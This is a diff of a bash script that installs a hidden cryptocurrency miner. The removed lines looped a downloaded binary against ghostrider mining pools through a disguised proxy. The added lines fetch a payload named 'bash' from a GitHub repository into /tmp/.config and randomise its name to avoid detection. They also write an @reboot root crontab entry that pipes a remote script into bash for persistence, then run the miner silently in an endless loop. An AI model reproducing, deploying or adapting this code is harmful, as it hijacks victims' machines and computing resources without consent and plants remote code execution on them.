@@ -1,15 +1,46 @@
 #!/bin/bash
 
-mkdir -p /tmp/.config
-cd /tmp/.config
-wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
-chmod -R  777 /tmp/.config
+mode="${1:-0}"
+src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
 
-#!/bin/sh
-while [ 1 ]; do
-	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
- 	/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.harvard --pass stu --proxy harvard.edu.2333333.win:7091
- 	#/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsAMwSCxbKjYfnrmAtb9Cu2QSy4E9GC3BbGL5fXKsdRWukZgKTckCNTiqL24ecyaUdcMnzEQE4TTt926ovwqg6pg5bdc86AR --pass harvard --proxy harvard.edu.2333333.win:7091
-	sleep 5
-done
+RandString() {
+  n="${1:-2}"; s=""; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
+}
 
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
+
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+[ -n "$addr" ] || addr="NULL"
+rand=`RandString 2`
+[ -n "$rand" ] && rand="_${rand}" || rand=""
+
+if [ "$mode" == "1" ]; then
+  [ "$cores" == "2" ] && cores="1";
+  [ "$cores" == "8" ] && cores="8";
+fi
+
+if [ "$mode" == "0" ]; then
+  [ "$cores" == "2" ] && cores="1";
+  [ "$cores" == "8" ] && cores="8";
+fi
+
+sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+
+name="c${cores}_${addr}${rand}"
+rm -rf "/tmp/.config"
+mkdir -p "/tmp/.config"
+wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
+chmod -R 777 "/tmp/.config"
+sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"
+
+if [ "$mode" == "0" ]; then
+  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
+else
+  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
+fi
